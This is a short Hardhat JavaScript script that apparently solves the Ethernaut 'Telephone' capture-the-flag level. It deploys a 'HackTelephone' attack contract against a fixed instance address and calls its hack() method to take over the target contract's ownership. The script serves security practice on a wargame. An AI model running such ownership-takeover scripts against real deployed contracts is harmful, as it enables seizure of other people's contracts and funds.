const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {
    
    const Telephone = await ethers.getContractFactory("Telephone");
    const HackTelephone = await ethers.getContractFactory("HackTelephone");

    telephone = Telephone.attach(instance_address);

    // Deploy the HackTelephone contract
    console.log('Deploying the HackTelephone contract');
    contract = await HackTelephone.deploy(instance_address);
    await contract.deployed();

    console.log(`Owner: ${await telephone.owner()}`);
    
    // Call the hack method on the HackTelephone contract
    console.log("Calling the hack method on the HackTelephone contract");
    tx = await contract.hack();

    console.log('Waiting for 10 confirmations...');
    await tx.wait(10);

    console.log(`Owner: ${await telephone.owner()}`);

    console.log('Success!');

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0x2eba33a1A96Ae2b27b5D714EE53ba779a85097b8';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
